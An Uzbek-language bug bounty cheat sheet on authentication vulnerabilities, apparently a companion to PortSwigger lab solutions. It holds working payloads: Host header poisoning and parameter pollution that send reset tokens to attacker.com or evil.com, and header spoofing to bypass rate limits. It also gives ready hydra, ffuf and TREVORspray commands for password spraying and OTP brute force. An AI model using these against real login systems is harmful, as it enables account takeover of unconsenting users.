# Authentication Vulnerabilities

> Lab yechimlari (PortSwigger'ning 14 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Autentifikatsiya = "sen haqiqatan o'sha odammisan" ni tekshirish mexanizmi (login, 2FA, parol
tiklash, session). Zaiflik shunda: bu mexanizmning biror bo'g'ini zaif yoki noto'g'ri — natijada
boshqa odam bo'lib kirasan. Ikki toifa: (1) **zaif mexanizm** (kuchsiz parol siyosati, rate-limit
yo'q, brute qilsa bo'ladi); (2) **buzuq logika** (enumeration, MFA'ni o'tkazib yuborish, reset
token'ni o'g'irlash).

**Ildiz sabab:** ishonch noto'g'ri joyga qo'yilgan — client'ga, bashorat qilinadigan qiymatga
(sequential token, zaif cookie), yoki bir xil bo'lmagan javoblarga (enumeration). Ko'pincha boshqa
zaiflik (Host header injection, IDOR) bilan birlashib to'liq account takeover beradi.

## Hujum yuzasi
Login, register, forgot-password/reset, "remember me" cookie, MFA/2FA, session boshqaruvi,
email/parol o'zgartirish. Har biri alohida nishon.

## Turlari
1. **Username enumeration** — javob/vaqt/lockout farqi orqali mavjud userni aniqlash.
2. **Brute-force / rate-limit bypass** — parolni/OTP'ni sindirish (IP spoof, spray, JSON massiv, race).
3. **MFA/2FA bypass** — step skip, response edit, OTP brute/reuse, 2FA IDOR.
4. **Parol tiklash zaifliklari** — bashorat qilinadigan/tekshirilmaydigan token, Host header poisoning,
   parametr ifloslantirish (eng unumli, ko'p to'laydi).
5. **Session / "remember me"** — zaif cookie formati, logout'dan keyin ishlashi, session fixation.
> Severity: ATO = odatda **High/Critical**. Katta pul shu yerda.

## 1. Username enumeration
```
- Xato farqi: "noto'g'ri parol" vs "user topilmadi"
- Status / javob uzunligi / javob vaqti farqi
- Register'da "bu email band"
```

## 2. Rate-limit / brute bypass
```http
X-Forwarded-For: 1.2.3.4      # har so'rovda o'zgartir
X-Forwarded-For: 127.0.0.1
X-Originating-IP / X-Real-IP / X-Client-IP
```
> Spray (1 parol × ko'p user) lockout'ni chetlab o'tadi. BBP'da brute ko'pincha taqiq — scope'ni o'qi.

## 3. MFA/2FA bypass
| Texnika | Tavsif |
|---------|--------|
| Step skip | step1'dan keyin to'g'ridan-to'g'ri `/account`ga o't |
| Response edit | `{"mfa":false}`/`{"success":true}` ga o'zgartir |
| OTP brute | rate limit yo'q bo'lsa 000000–999999 |
| OTP reuse | eski OTP hali ishlaydimi |
| MFA o'chirish IDOR | boshqa userning 2FA'sini o'chir |

## 4. Parol tiklash (eng unumli)
```
- Token bashorat qilsa bo'ladimi (sequential/timestamp)?
- Token muddati/bir martaligi bormi?
- Host header injection: link domenni header'dan oladimi? (20-papka)
- Reset so'rovida yashirin userId/email param bormi?
- Javobda token qaytadimi?
```
### Host header poisoning
```http
POST /forgot-password HTTP/1.1
Host: attacker.com

email=victim@target.com
→ victim emailiga attacker.com/reset?token=... keladi → token senga tushadi
```
### Parametr ifloslantirish
```http
email=victim@target.com&email=attacker@evil.com
{"email":["victim@x.com","attacker@evil.com"]}
```

## 5. Session / "remember me"
```
- Cookie bashorat qilsa bo'ladimi (base64(user:md5(pass)))?
- Logout'dan keyin session amal qiladimi?
- Session fixation: login'dan oldingi ID keyin ham o'shami?
- JWT bo'lsa → 23-papka
```

## TOOLLAR

### hydra — login brute (ehtiyot, scope!)
```bash
hydra -L users.txt -p 'Summer2024!' target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```
> Ko'p userга bitta parolni (spray) uradi. `F=incorrect` — xato javobdagi so'z, muvaffaqiyatni shundan ajratadi.

### ffuf — enumeration / rate-limit test
```bash
ffuf -w users.txt -u https://target.com/login -X POST -d "user=FUZZ&pass=test" -H "Content-Type: application/x-www-form-urlencoded" -mr "topilmadi"
```
> Har userда javob "topilmadi" chiqadimi — mavjud userlarni ajratadi (enumeration).

### Burp Intruder — OTP brute / response manipulyatsiya
```
Burp Intruder → OTP maydonini payload qil → 0000–9999 → status/length farqini ko'r
```
> Rate limit yo'q bo'lsa 4 xonali OTP'ni bir necha daqiqada sindiradi.

### TREVORspray — o365/okta spray
```bash
trevorspray -u users.txt -p 'Password1' --url https://login.target.com
```
> Lockout'ga tushmaslik uchun sekin, aqlli spray qiladi (korporativ login uchun).

### jwt_tool — JWT bo'lsa (23-papkaga qara)
```bash
jwt_tool <TOKEN> -M at -t https://target.com/
```
> Session JWT bo'lsa — alg:none, secret brute va boshqa hujumlarni avtomat sinaydi.

## PoC
To'liq ATO ko'rsat: qaysi yo'l bilan boshqa odamning akkauntiga kirding.

## Himoya
Rate limit + lockout + CAPTCHA, bir xil xato xabar, kuchli/random/qisqa muddatli reset
token (user'ga bog'langan), MFA server tomonda majburiy, Host header'ga ishonmaslik.
